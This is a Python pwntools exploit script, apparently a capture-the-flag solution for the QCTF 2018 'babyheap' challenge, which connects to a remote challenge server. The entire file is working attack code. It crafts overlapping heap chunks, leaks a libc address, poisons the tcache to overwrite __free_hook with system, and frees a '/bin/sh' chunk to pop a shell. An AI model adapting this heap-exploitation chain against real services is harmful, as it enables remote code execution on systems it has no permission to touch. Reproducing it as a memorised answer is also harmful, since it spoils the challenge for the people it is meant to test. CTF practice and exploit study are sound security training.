from pwn import *
# s=process('./QCTF_2018_babyheap')
s=remote("node4.buuoj.cn","27998")
def create(size,pay):
	s.recvuntil('Your choice :')
	s.sendline('1')
	s.recvuntil('Size:')
	s.sendline(str(size))
	s.recvuntil('Data:')
	s.send(pay)

def delete(idx):
	s.recvuntil('Your choice :')
	s.sendline('2')
	s.recvuntil('Index')
	s.sendline(str(idx))
def show():
        s.recvuntil('Your choice :')
        s.sendline('3')

create(0x100-8,'A'*0x20+'\n')#0
create(0x650-8,'B'*0x5f0+p64(0x600)+p64(0x50)+'\n')#1
create(0x500,'C'*0x20+'\n')#2
create(0x100,'D'*0x20+'\n')#3
delete(0)
delete(1)
create(0x100-8,'A'*0xf8+'\n')#0
create(0x500-8,'E'*0x10+'\n')#1
create(0x100-8,'F'*0x10+'\n')#4
delete(1)
delete(2)
create(0x500-8,'G'*0x10+'\n')#1
show()
s.recvuntil('4 : ')
libc = u64(s.recv(6)+'\x00'*2)-0x3ebca0
print hex(libc)
create(0x100-8,'H'*0x10+'\n')#2
delete(4)
delete(2)
create(0x100-8,p64(libc+0x3ED8E8)+'\n')
create(0x100-8,p64(libc+0x3ed8e8)+'\n')
create(0x100-8,p64(libc+0x4F440)+'\n')
create(0x200-8,'/bin/sh\x00'+'\n')#6
delete(6)
s.interactive()